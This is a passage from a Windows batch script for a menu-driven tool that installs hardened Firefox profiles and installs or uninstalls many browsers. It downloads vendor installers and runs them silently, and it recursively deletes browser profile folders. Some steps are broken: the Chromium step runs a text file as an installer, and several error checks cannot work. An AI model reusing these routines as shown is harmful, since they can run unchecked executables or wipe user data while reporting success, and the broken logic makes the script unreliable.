echo [3] Spicetify Management: Customize Spotify with themes and extensions.
echo [4] Vencord Management: Install or manage Vencord for Discord customization.
echo [5] Change Color Scheme: Customize the console color scheme.
echo [6] Return to main menu
set "HELP_CHOICE="
set /p HELP_CHOICE=Enter your choice (1-6): 
if "!HELP_CHOICE!"=="1" goto :SYSTEM_MANAGEMENT
if "!HELP_CHOICE!"=="2" goto :BROWSER_MENU
if "!HELP_CHOICE!"=="3" goto :SPOTIFY_PROMPT
if "!HELP_CHOICE!"=="4" goto :VENCORD_CHECK_DEPENDENCIES
if "!HELP_CHOICE!"=="5" goto :COLOR_PICKER
if "!HELP_CHOICE!"=="6" goto :MENU
:: Check for any case variation of "help"
echo !HELP_CHOICE! | findstr /I "^Help$" >nul
if !errorlevel! equ 0 goto :HELP_MENU
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :HELP_MENU

:BROWSER_MENU
echo.
echo Browser Management Menu:
echo [1] Install Hardened Firefox (this is what i recommend)
echo [2] List Browsers Available for Installation
echo [3] List Browsers Available for Uninstallation
echo [4] List Debloat Options
echo [5] Return to main menu
set "BROWSER_CHOICE="
set /p BROWSER_CHOICE=Enter your choice (1-5): 
if "!BROWSER_CHOICE!"=="1" goto :INSTALL_HARDENED_FIREFOX
if "!BROWSER_CHOICE!"=="2" goto :LIST_BROWSERS_INSTALLATION
if "!BROWSER_CHOICE!"=="3" goto :LIST_BROWSERS_UNINSTALL
if "!BROWSER_CHOICE!"=="4" goto :LIST_DEBLOAT_OPTIONS 
if "!BROWSER_CHOICE!"=="5" goto :MENU
echo Invalid choice. Please enter 1, 2, 3, 4, or 5.
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :BROWSER_MENU

:INSTALL_HARDENED_FIREFOX
echo.
echo Installing Hardened Firefox...
echo This will install Firefox (if not already installed) and create a new profile with a hardened user.js configuration.
echo.

:: Display user.js options
echo Select a user.js template for hardening:
echo [1] Narsil user.js
echo     Summary: A configuration for hardening Firefox with focus on privacy, security, and anti-fingerprinting. Based on arkenfox, it aims to provide the safest and fastest setup possible. Suitable for users seeking strong protections with minimal breakage.
echo [2] Arkenfox user.js
echo     Summary: Comprehensive template focused on maximum privacy and security. Reduces tracking and fingerprinting but may break some websites. Highly customizable via user-overrides.js. Recommended for advanced users.
echo [3] Betterfox user.js (this is what i recommend)
echo     Summary: Balances privacy, security, and performance. Aims to minimize website breakage while enhancing speed and reducing tracking. Suitable for users wanting a less aggressive approach.
echo [4] Cancel and return to Browser Management Menu
set "USERJS_CHOICE="
set /p USERJS_CHOICE=Enter your choice (1-4): 
if "!USERJS_CHOICE!"=="1" (
    set "USERJS_URL=https://codeberg.org/Narsil/user.js/raw/branch/main/desktop/user.js"
    set "USERJS_NAME=Narsil"
    goto :CONFIRM_HARDENED_FIREFOX
)
if "!USERJS_CHOICE!"=="2" (
    set "USERJS_URL=https://raw.githubusercontent.com/arkenfox/user.js/master/user.js"
    set "USERJS_NAME=Arkenfox"
    goto :CONFIRM_HARDENED_FIREFOX
)
if "!USERJS_CHOICE!"=="3" goto :BETTERFOX_SUBMENU
if "!USERJS_CHOICE!"=="4" goto :BROWSER_MENU
echo Invalid choice. Please enter 1, 2, 3, or 4.
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :INSTALL_HARDENED_FIREFOX

:BETTERFOX_SUBMENU
echo.
echo Select Betterfox variant:
echo [1] Standard (user.js) - All the essentials. Combines speed, privacy, security, and clean UI without breakage. (this is what i recommend)
echo [2] Fastfox.js - Increases Firefox's browsing speed. Give Chrome a run for its money!
echo [3] Securefox.js - Protects user data without causing site breakage.
echo [4] Peskyfox.js - Provides a clean, distraction-free browsing experience.
echo [5] Smoothfox.js - Enables smooth scrolling, similar to Edge or customized styles.
echo [6] Cancel and return to Hardened Firefox menu
set "BETTER_CHOICE="
set /p BETTER_CHOICE=Enter your choice (1-6): 
if "!BETTER_CHOICE!"=="1" (
    set "USERJS_URL=https://raw.githubusercontent.com/yokoffing/Betterfox/main/user.js"
    set "USERJS_NAME=Betterfox Standard"
)
if "!BETTER_CHOICE!"=="2" (
    set "USERJS_URL=https://raw.githubusercontent.com/yokoffing/Betterfox/main/Fastfox.js"
    set "USERJS_NAME=Betterfox Fastfox"
)
if "!BETTER_CHOICE!"=="3" (
    set "USERJS_URL=https://raw.githubusercontent.com/yokoffing/Betterfox/main/Securefox.js"
    set "USERJS_NAME=Betterfox Securefox"
)
if "!BETTER_CHOICE!"=="4" (
    set "USERJS_URL=https://raw.githubusercontent.com/yokoffing/Betterfox/main/Peskyfox.js"
    set "USERJS_NAME=Betterfox Peskyfox"
)
if "!BETTER_CHOICE!"=="5" (
    set "USERJS_URL=https://raw.githubusercontent.com/yokoffing/Betterfox/main/Smoothfox.js"
    set "USERJS_NAME=Betterfox Smoothfox"
)
if "!BETTER_CHOICE!"=="6" goto :INSTALL_HARDENED_FIREFOX
if not defined USERJS_URL (
    echo Invalid choice. Please enter 1-6.
    pause
    if exist "!CONFIG_FILE!" (
        for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
            set "SAVED_COLOR=%%C"
            color !SAVED_COLOR!
        )
    )
    goto :BETTERFOX_SUBMENU
)
goto :CONFIRM_HARDENED_FIREFOX

:CONFIRM_HARDENED_FIREFOX
echo.
echo === Confirmation ===
echo You have selected the !USERJS_NAME! user.js template.
echo The following actions will be performed:
echo 1. Check if Firefox is installed. If not, install Mozilla Firefox.
echo 2. Create a new Firefox profile for hardening.
echo 3. Download and apply the !USERJS_NAME! user.js to the new profile.
echo 4. Install uBlock Origin extension for the new Firefox profile.
echo 5. Provide instructions to use the hardened profile.
echo.
echo Note: Some websites may not work correctly with hardened settings.
echo.
set "CONFIRM_CHOICE="
set /p CONFIRM_CHOICE=Proceed with these actions? (Y/N): 
if /i "!CONFIRM_CHOICE!"=="Y" goto :EXECUTE_HARDENED_FIREFOX
if /i "!CONFIRM_CHOICE!"=="N" (
    echo Installation cancelled.
    pause
    if exist "!CONFIG_FILE!" (
        for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
            set "SAVED_COLOR=%%C"
            color !SAVED_COLOR!
        )
    )
    goto :BROWSER_MENU
)
echo Invalid choice. Please enter Y or N.
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :CONFIRM_HARDENED_FIREFOX

:EXECUTE_HARDENED_FIREFOX
:: Check if Firefox is installed, install if not
echo Checking for Firefox installation...
where firefox >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo Firefox not found. Installing Mozilla Firefox...
    powershell -Command "iwr -useb https://download.mozilla.org/?product=firefox-latest&os=win64&lang=en-US -OutFile $env:TEMP\FirefoxInstaller.exe"
    if %ERRORLEVEL% equ 0 (
        echo Installing Firefox...
        start /wait "" "%TEMP%\FirefoxInstaller.exe" /S
        if %ERRORLEVEL% equ 0 (
            echo Mozilla Firefox installed successfully.
        ) else (
            echo Failed to install Mozilla Firefox. Exiting.
            pause
            if exist "!CONFIG_FILE!" (
                for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
                    set "SAVED_COLOR=%%C"
                    color !SAVED_COLOR!
                )
            )
            goto :BROWSER_MENU
        )
        del "%TEMP%\FirefoxInstaller.exe" 2>nul
    ) else (
        echo Failed to download Mozilla Firefox installer. Exiting.
        pause
        if exist "!CONFIG_FILE!" (
            for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
                set "SAVED_COLOR=%%C"
                color !SAVED_COLOR!
            )
        )
        goto :BROWSER_MENU
    )
) else (
    echo Firefox is already installed.
)

:: Create a new Firefox profile
echo Creating a new Firefox profile for hardening...
for /f "delims=" %%P in ('powershell -Command "& { $random = Get-Random -Minimum 1000 -Maximum 9999; $profileName = 'hardened_profile_' + $random; & 'firefox' -CreateProfile $profileName; $profilePath = (Get-ChildItem -Path $env:APPDATA\Mozilla\Firefox\Profiles\ | Where-Object { $_.Name -like '*hardened_profile_' + $random + '*' }).FullName; Write-Output $profilePath }"') do (
    set "PROFILE_PATH=%%P"
)
if not defined PROFILE_PATH (
    echo Failed to create Firefox profile. Exiting.
    pause
    if exist "!CONFIG_FILE!" (
        for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
            set "SAVED_COLOR=%%C"
            color !SAVED_COLOR!
        )
    )
    goto :BROWSER_MENU
)
echo New profile created at: !PROFILE_PATH!

:: Download the selected user.js
echo Downloading !USERJS_NAME! user.js...
powershell -Command "iwr -useb !USERJS_URL! -OutFile '!PROFILE_PATH!\user.js'"
if %ERRORLEVEL% equ 0 (
    echo !USERJS_NAME! user.js downloaded and applied to profile at !PROFILE_PATH!.
) else (
    echo Failed to download !USERJS_NAME! user.js. Exiting.
    pause
    if exist "!CONFIG_FILE!" (
        for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
            set "SAVED_COLOR=%%C"
            color !SAVED_COLOR!
        )
    )
    goto :BROWSER_MENU
)

:: Install uBlock Origin for Firefox
echo Installing uBlock Origin for the new Firefox profile...
mkdir "!PROFILE_PATH!\extensions" 2>nul
powershell -Command "iwr -useb https://addons.mozilla.org/firefox/downloads/latest/ublock-origin/addon-607454-latest.xpi -OutFile '!PROFILE_PATH!\extensions\uBlock0@raymondhill.net.xpi'"
if %ERRORLEVEL% equ 0 (
    echo uBlock Origin installed successfully for the new Firefox profile.
) else (
    echo Failed to download uBlock Origin. Please install it manually from addons.mozilla.org.
)

:: Instructions for using the new profile
echo.
echo To use the hardened Firefox profile:
echo 1. Start Firefox with the profile manager: firefox -P
echo 2. Select the profile starting with 'hardened_profile_'
echo 3. Optionally, set it as the default profile in the profile manager.
echo.
echo Note: uBlock Origin has been installed automatically for this profile.
echo Some websites may not work correctly with hardened settings. Check !USERJS_NAME! documentation for customization options.
echo Hardened Firefox setup complete.
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :BROWSER_MENU

:LIST_BROWSERS_INSTALLATION
echo.
echo Browsers available for installation:
echo [1] Google Chrome (Chromium-based)
echo [2] Chromium (Chromium-based)
echo [3] Brave (Chromium-rbased)
echo [4] Opera (Chomium-based)
echo [5] Opera GX (Chromium-based)
echo [6] Vivaldi (Chromium-based)
echo -------------------------------------------------------------
echo [7] Mozilla Firefox (Firefox-based)
echo [8] Waterfox (Firefox-based)
echo [9] LibreWolf (Firefox-based)
echo [10] Pale Moon (Firefox-based)
echo [11] Tor Browser (Firefox-based)
echo [12] Return to Browser Management Menu
set "BROWSER_CHOICE="
set /p BROWSER_CHOICE=Enter your choice (1-12): 
if "!BROWSER_CHOICE!"=="1" goto :INSTALL_CHROME
if "!BROWSER_CHOICE!"=="2" goto :INSTALL_CHROMIUM
if "!BROWSER_CHOICE!"=="3" goto :INSTALL_BRAVE
if "!BROWSER_CHOICE!"=="4" goto :INSTALL_OPERA
if "!BROWSER_CHOICE!"=="5" goto :INSTALL_OPERA_GX
if "!BROWSER_CHOICE!"=="6" goto :INSTALL_VIVALDI
if "!BROWSER_CHOICE!"=="7" goto :INSTALL_FIREFOX
if "!BROWSER_CHOICE!"=="8" goto :INSTALL_WATERFOX
if "!BROWSER_CHOICE!"=="9" goto :INSTALL_LIBREWOLF
if "!BROWSER_CHOICE!"=="10" goto :INSTALL_PALEMOON
if "!BROWSER_CHOICE!"=="11" goto :INSTALL_TOR
if "!BROWSER_CHOICE!"=="12" goto :BROWSER_MENU
echo Invalid choice. Please enter 1-12.
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_INSTALLATION

:LIST_BROWSERS_UNINSTALL
echo.
echo Browsers available for uninstallation:
echo [1] Google Chrome (Chromium-based)
echo [2] Chromium (Chromium-based)
echo [3] Brave (Chromium-based)
echo [4] Opera (Chromium-based)
echo [5] Opera GX (Chromium-based)
echo [6] Vivaldi (Chromium-based)
echo -------------------------------------------------------------
echo [7] Mozilla Firefox (Firefox-based)
echo [8] Waterfox (Firefox-based)
echo [9] LibreWolf (Firefox-based)
echo [10] Pale Moon (Firefox-based)
echo [11] Tor Browser (Firefox-based)
echo [12] Return to Browser Management Menu
set "BROWSER_CHOICE="
set /p BROWSER_CHOICE=Enter your choice (1-12): 
if "!BROWSER_CHOICE!"=="1" goto :UNINSTALL_CHROME
if "!BROWSER_CHOICE!"=="2" goto :UNINSTALL_CHROMIUM
if "!BROWSER_CHOICE!"=="3" goto :UNINSTALL_BRAVE
if "!BROWSER_CHOICE!"=="4" goto :UNINSTALL_OPERA
if "!BROWSER_CHOICE!"=="5" goto :UNINSTALL_OPERA_GX
if "!BROWSER_CHOICE!"=="6" goto :UNINSTALL_VIVALDI
if "!BROWSER_CHOICE!"=="7" goto :UNINSTALL_FIREFOX
if "!BROWSER_CHOICE!"=="8" goto :UNINSTALL_WATERFOX
if "!BROWSER_CHOICE!"=="9" goto :UNINSTALL_LIBREWOLF
if "!BROWSER_CHOICE!"=="10" goto :UNINSTALL_PALEMOON
if "!BROWSER_CHOICE!"=="11" goto :UNINSTALL_TOR
if "!BROWSER_CHOICE!"=="12" goto :BROWSER_MENU
echo Invalid choice. Please enter 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, or 12.
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_UNINSTALL

:UNINSTALL_CHROME
echo Uninstalling Google Chrome...
wmic product where "name like 'Google Chrome'" call uninstall /nointeractive >nul 2>&1
if %ERRORLEVEL% equ 0 (
    echo Google Chrome uninstalled successfully.
    rd /s /q "%LocalAppData%\Google\Chrome" 2>nul
) else (
    echo Failed to uninstall Google Chrome or it is not installed.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_UNINSTALL

:UNINSTALL_CHROMIUM
echo Uninstalling Chromium...
rd /s /q "%LocalAppData%\Chromium" 2>nul
if %ERRORLEVEL% equ 0 (
    echo Chromium uninstalled successfully.
) else (
    echo Failed to uninstall Chromium or it is not installed.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_UNINSTALL

:UNINSTALL_BRAVE
echo Uninstalling Brave...
wmic product where "name like 'Brave'" call uninstall /nointeractive >nul 2>&1
if %ERRORLEVEL% equ 0 (
    echo Brave uninstalled successfully.
    rd /s /q "%LocalAppData%\BraveSoftware" 2>nul
) else (
    echo Failed to uninstall Brave or it is not installed.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_UNINSTALL

:UNINSTALL_OPERA
echo Uninstalling Opera...
wmic product where "name like 'Opera%%'" call uninstall /nointeractive >nul 2>&1
if %ERRORLEVEL% equ 0 (
    echo Opera uninstalled successfully.
    rd /s /q "%AppData%\Opera Software" 2>nul
) else (
    echo Failed to uninstall Opera or it is not installed.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_UNINSTALL

:UNINSTALL_OPERA_GX
echo Uninstalling Opera GX...
wmic product where "name like 'Opera GX%%'" call uninstall /nointeractive >nul 2>&1
if %ERRORLEVEL% equ 0 (
    echo Opera GX uninstalled successfully.
    rd /s /q "%AppData%\Opera Software\Opera GX" 2>nul
) else (
    echo Failed to uninstall Opera GX or it is not installed.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_UNINSTALL

:UNINSTALL_VIVALDI
echo Uninstalling Vivaldi...
wmic product where "name like 'Vivaldi'" call uninstall /nointeractive >nul 2>&1
if %ERRORLEVEL% equ 0 (
    echo Vivaldi uninstalled successfully.
    rd /s /q "%LocalAppData%\Vivaldi" 2>nul
) else (
    echo Failed to uninstall Vivaldi or it is not installed.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_UNINSTALL

:UNINSTALL_FIREFOX
echo Uninstalling Mozilla Firefox...
wmic product where "name like 'Mozilla Firefox%%'" call uninstall /nointeractive >nul 2>&1
if %ERRORLEVEL% equ 0 (
    echo Mozilla Firefox uninstalled successfully.
    rd /s /q "%ProgramFiles%\Mozilla Firefox" 2>nul
    rd /s /q "%AppData%\Mozilla" 2>nul
) else (
    echo Failed to uninstall Mozilla Firefox or it is not installed.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_UNINSTALL

:UNINSTALL_WATERFOX
echo Uninstalling Waterfox...
wmic product where "name like 'Waterfox%%'" call uninstall /nointeractive >nul 2>&1
if %ERRORLEVEL% equ 0 (
    echo Waterfox uninstalled successfully.
    rd /s /q "%ProgramFiles%\Waterfox" 2>nul
    rd /s /q "%AppData%\Waterfox" 2>nul
) else (
    echo Failed to uninstall Waterfox or it is not installed.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_UNINSTALL

:UNINSTALL_LIBREWOLF
echo Uninstalling LibreWolf...
wmic product where "name like 'LibreWolf%%'" call uninstall /nointeractive >nul 2>&1
if %ERRORLEVEL% equ 0 (
    echo LibreWolf uninstalled successfully.
    rd /s /q "%ProgramFiles%\LibreWolf" 2>nul
    rd /s /q "%AppData%\LibreWolf" 2>nul
) else (
    echo Failed to uninstall LibreWolf or it is not installed.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_UNINSTALL

:UNINSTALL_PALEMOON
echo Uninstalling Pale Moon...
wmic product where "name like 'Pale Moon%%'" call uninstall /nointeractive >nul 2>&1
if %ERRORLEVEL% equ 0 (
    echo Pale Moon uninstalled successfully.
    rd /s /q "%ProgramFiles%\Pale Moon" 2>nul
    rd /s /q "%AppData%\Moonchild Productions" 2>nul
) else (
    echo Failed to uninstall Pale Moon or it is not installed.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_UNINSTALL

:UNINSTALL_TOR
echo Uninstalling Tor Browser...
if exist "%UserProfile%\Desktop\Tor Browser" (
    rd /s /q "%UserProfile%\Desktop\Tor Browser" 2>nul
    if %ERRORLEVEL% equ 0 (
        echo Tor Browser uninstalled successfully.
    ) else (
        echo Failed to uninstall Tor Browser or it is not installed.
    )
) else (
    echo Tor Browser not found or already uninstalled.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_UNINSTALL

:INSTALL_CHROME
echo Installing Google Chrome (Chromium-based)...
powershell -Command "iwr -useb https://dl.google.com/chrome/install/latest/chrome_installer.exe -OutFile $env:TEMP\ChromeInstaller.exe"
if %ERRORLEVEL% equ 0 (
    start /wait "" "%TEMP%\ChromeInstaller.exe" /silent /install
    if %ERRORLEVEL% equ 0 (
        echo Google Chrome installed successfully.
        echo Opening Chrome to install uBlock Origin...
        start chrome "https://chromewebstore.google.com/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm"
        echo Please click 'Add to Chrome' to install uBlock Origin, then press any key to continue...
    ) else (
        echo Failed to install Google Chrome.
    )
    del "%TEMP%\ChromeInstaller.exe" 2>nul
) else (
    echo Failed to download Google Chrome installer.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_INSTALLATION

:INSTALL_CHROMIUM
echo Installing Chromium (Chromium-based)...
powershell -Command "iwr -useb https://commondatastorage.googleapis.com/chromium-browser-snapshots/Win_x64/LAST_CHANGE -OutFile $env:TEMP\chromium_installer.exe"
if %ERRORLEVEL% equ 0 (
    start /wait "" "%TEMP%\chromium_installer.exe"
    if %ERRORLEVEL% equ 0 (
        echo Chromium installed successfully.
        echo Opening Chromium to install uBlock Origin...
        start "" "%LocalAppData%\Chromium\Application\chrome.exe" "https://chromewebstore.google.com/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm"
        echo Please click 'Add to Chrome' to install uBlock Origin, then press any key to continue...
    ) else (
        echo Failed to install Chromium.
    )
    del "%TEMP%\chromium_installer.exe" 2>nul
) else (
    echo Failed to download Chromium installer. Please use an official source or manual installation.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_INSTALLATION

:INSTALL_BRAVE
echo Installing Brave (Chromium-based)...
powershell -Command "iwr -useb https://referrals.brave.com/latest/BraveBrowserSetup.exe -OutFile $env:TEMP\BraveInstaller.exe"
if %ERRORLEVEL% equ 0 (
    start /wait "" "%TEMP%\BraveInstaller.exe" /silent /install
    if %ERRORLEVEL% equ 0 (
        echo Brave installed successfully.
        echo Opening Brave to install uBlock Origin...
        start brave "https://chromewebstore.google.com/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm"
        echo Please click 'Add to Chrome' to install uBlock Origin, then press any key to continue...
    ) else (
        echo Failed to install Brave.
    )
    del "%TEMP%\BraveInstaller.exe" 2>nul
) else (
    echo Failed to download Brave installer.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_INSTALLATION

:INSTALL_OPERA
echo Installing Opera (Chromium-based)...
powershell -Command "iwr -useb https://get.geo.opera.com/pub/opera/desktop/110.0.5173.25/win/Opera_110.0.5173.25_Setup.exe -OutFile $env:TEMP\OperaInstaller.exe"
if %ERRORLEVEL% equ 0 (
    start /wait "" "%TEMP%\OperaInstaller.exe" /silent
    if %ERRORLEVEL% equ 0 (
        echo Opera installed successfully.
        echo Opening Opera to install uBlock Origin...
        start opera "https://chromewebstore.google.com/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm"
        echo Please click 'Add to Chrome' to install uBlock Origin, then press any key to continue...
    ) else (
        echo Failed to install Opera.
    )
    del "%TEMP%\OperaInstaller.exe" 2>nul
) else (
    echo Failed to download Opera installer.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_INSTALLATION

:INSTALL_OPERA_GX
echo Installing Opera GX (Chromium-based)...
powershell -Command "iwr -useb https://get.geo.opera.com/pub/opera_gx/110.0.5173.25/win/Opera_GX_110.0.5173.25_Setup.exe -OutFile $env:TEMP\OperaGXInstaller.exe"
if %ERRORLEVEL% equ 0 (
    start /wait "" "%TEMP%\OperaGXInstaller.exe" /silent
    if %ERRORLEVEL% equ 0 (
        echo Opera GX installed successfully.
        echo Opening Opera GX to install uBlock Origin...
        start opera "https://chromewebstore.google.com/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm"
        echo Please click 'Add to Chrome' to install uBlock Origin, then press any key to continue...
    ) else (
        echo Failed to install Opera GX.
    )
    del "%TEMP%\OperaGXInstaller.exe" 2>nul
) else (
    echo Failed to download Opera GX installer.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_INSTALLATION

:INSTALL_VIVALDI
echo Installing Vivaldi (Chromium-based)...
powershell -Command "iwr -useb https://downloads.vivaldi.com/stable/Vivaldi.6.8.3381.45.exe -OutFile $env:TEMP\VivaldiInstaller.exe"
if %ERRORLEVEL% equ 0 (
    start /wait "" "%TEMP%\VivaldiInstaller.exe" /silent
    if %ERRORLEVEL% equ 0 (
        echo Vivaldi installed successfully.
        echo Opening Vivaldi to install uBlock Origin...
        start vivaldi "https://chromewebstore.google.com/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm"
        echo Please click 'Add to Chrome' to install uBlock Origin, then press any key to continue...
    ) else (
        echo Failed to install Vivaldi.
    )
    del "%TEMP%\VivaldiInstaller.exe" 2>nul
) else (
    echo Failed to download Vivaldi installer.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_INSTALLATION

:INSTALL_FIREFOX
echo Installing Mozilla Firefox (Firefox-based)...
powershell -Command "iwr -useb https://download.mozilla.org/?product=firefox-latest&os=win64&lang=en-US -OutFile $env:TEMP\FirefoxInstaller.exe"
if %ERRORLEVEL% equ 0 (
    start /wait "" "%TEMP%\FirefoxInstaller.exe" /S
    if %ERRORLEVEL% equ 0 (
        echo Mozilla Firefox installed successfully.
        echo Note: For hardened Firefox with uBlock Origin, use option [1] in Browser Management Menu.
    ) else (
        echo Failed to install Mozilla Firefox.
    )
    del "%TEMP%\FirefoxInstaller.exe" 2>nul
) else (
    echo Failed to download Mozilla Firefox installer.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_INSTALLATION

:INSTALL_WATERFOX
echo Installing Waterfox (Firefox-based)...
powershell -Command "iwr -useb https://cdn.waterfox.net/releases/win64/installer/Waterfox%20G6.0.5%20Setup.exe -OutFile $env:TEMP\WaterfoxInstaller.exe"
if %ERRORLEVEL% equ 0 (
    start /wait "" "%TEMP%\WaterfoxInstaller.exe" /silent
    if %ERRORLEVEL% equ 0 (
        echo Waterfox installed successfully.
        echo Note: uBlock Origin must be installed manually from addons.mozilla.org.
    ) else (
        echo Failed to install Waterfox.
    )
    del "%TEMP%\WaterfoxInstaller.exe" 2>nul
) else (
    echo Failed to download Waterfox installer.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_INSTALLATION

:INSTALL_LIBREWOLF
echo Installing LibreWolf (Firefox-based)...
powershell -Command "iwr -useb https://gitlab.com/librewolf-community/browsers/win64/-/jobs/artifacts/master/download?job=build -OutFile $env:TEMP\LibreWolfInstaller.exe"
if %ERRORLEVEL% equ 0 (
    start /wait "" "%TEMP%\LibreWolfInstaller.exe" /silent
    if %ERRORLEVEL% equ 0 (
        echo LibreWolf installed successfully.
        echo Note: uBlock Origin is included by default in LibreWolf. No further action needed.
    ) else (
        echo Failed to install LibreWolf.
    )
    del "%TEMP%\LibreWolfInstaller.exe" 2>nul
) else (
    echo Failed to download LibreWolf installer.
)
pause
if exist "!CONFIG_FILE!" (
